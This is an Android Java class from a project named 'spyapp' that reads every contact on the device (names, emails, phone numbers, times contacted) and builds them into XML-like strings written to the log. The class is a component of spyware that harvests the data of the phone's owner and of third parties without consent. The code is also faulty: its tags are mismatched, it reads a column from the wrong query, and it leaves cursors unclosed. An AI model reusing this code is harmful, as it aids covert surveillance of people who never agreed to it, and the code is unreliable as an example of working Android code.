package com.example.spyapp;

import java.util.ArrayList;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.location.Address;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Im;
import android.provider.ContactsContract.CommonDataKinds.Organization;
import android.util.Log;

public class Contact {
	private String id;
	private String displayName;
	private ArrayList<Phone> phone;
	private String email;
	private ArrayList<String> notes;
	private ArrayList<Address> addresses = new ArrayList<Address>();
	private ArrayList<Im> imAddresses;
	private Organization organization;
 	
	
	public Contact() {
		super();
	}
	public Organization getOrganization() {
		return organization;
	}
	public void setOrganization(Organization organization) {
		this.organization = organization;
	}
	public ArrayList<Im> getImAddresses() {
		return imAddresses;
	}
	public void setImAddresses(ArrayList<Im> imAddresses) {
		this.imAddresses = imAddresses;
 	}
	public void addImAddresses(Im imAddr) {
		this.imAddresses.add(imAddr);
	}
	public ArrayList<String> getNotes() {
		return notes;
	}
	public void setNotes(ArrayList<String> notes) {
		this.notes = notes;
	}
	public void addNote(String note) {
		this.notes.add(note);
	}
	public ArrayList<Address> getAddresses() {
		return addresses;
	}
	public void setAddresses(ArrayList<Address> addresses) {
		this.addresses = addresses;
	}
	public void addAddress(Address address) {
		this.addresses.add(address);
	}
	public String getEmail() {
		return email;
	}
	public void setEmail(String email) {
		this.email = email;
	}
	
	public String getId() {
		return id;
	}
	public void setId(String id) {
 		this.id = id;
	}
	public String getDisplayName() {
		return displayName;
	}
	public void setDisplayName(String dName) {
		this.displayName = dName;
	}
	public ArrayList<Phone> getPhone() {
		return phone;
	}
	public void setPhone(ArrayList<Phone> phone) {
		this.phone = phone;
	}
	public void addPhone(Phone phone) {
		this.phone.add(phone);
	}
	public void CreateListContactFromPhone(Context context){
		 String phoneNo="";
		 String adresse="";
		 String Contactinfos="";
		ArrayList<String> ContactsInfos = new ArrayList<String>();
		ContentResolver cr = context.getContentResolver();
       Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
               null, null, null, null);
       if (cur.getCount() > 0) {
           while (cur.moveToNext()) {
               String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
               Cursor cur1 = cr.query( 
                       ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
                       ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", 
                               new String[]{id}, null); 
               while (cur1.moveToNext()) { 
                   //to get the contact names & mail
                   String name=" <name>"+cur1.getString(cur1.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))+"</name> ";
                  // Log.e("Name :", name);
                   String email =" <mail>" +cur1.getString(cur1.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA))+"</mail>";
                  
               /*    String addrWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?"; 
               	String[] addrWhereParams = new String[]{id, 
               		ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE}; 
               	Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI, 
                               null, addrWhere,addrWhereParams, null); 
               	while(addrCur.moveToNext()) { 
               String poBox ="<number>"+ cur1.getString(
                           cur1.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POBOX))+"</number>";
       		String street = "<street>"+cur1.getString(
                           cur1.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET))+"</street>";
       		String city = "<city>"+cur1.getString(
                           cur1.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY))+"</city>";
       		String state = "<state>"+cur1.getString(
                           cur1.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION))+"<state>";
       		String postalCode = "<postalCode>"+cur1.getString(
                           cur1.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE))+"</postalcode>";
       		String country = "<country>"+cur1.getString(
                           cur1.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY))+"</country>";
       		String type = "<type>"+cur1.getString(
                           cur1.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE))+"</type>";
                   //Log.e("Email", email);
              
       		adresse=adresse+"<adresse>"+poBox+street+city+state+postalCode+country+type+"</adresse>";
               	}*/
                  if (Integer.parseInt(cur.getString(
                          cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                       Cursor pCur = cr.query(
                      		 ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
                      		 null, 
                      		 ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?", 
                      		 new String[]{id}, null);
                       
                       while (pCur.moveToNext()) {
                      	  phoneNo =phoneNo+" <phone><phoneNumber>"+ pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))+"<phoneNumber> "
                      			  +"</timeContact>"+pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED))+"</timeContact></phone>";
                    
               }
                	
                       }
                 
               	//cur1.close();
                  Contactinfos=name+" "+adresse+" "+phoneNo+" "+email;
                  ContactsInfos.add(Contactinfos);
                  Log.e("GetContact",Contactinfos);
                  phoneNo="";
               }
               
               cur1.close();
           }
       }
	}
}
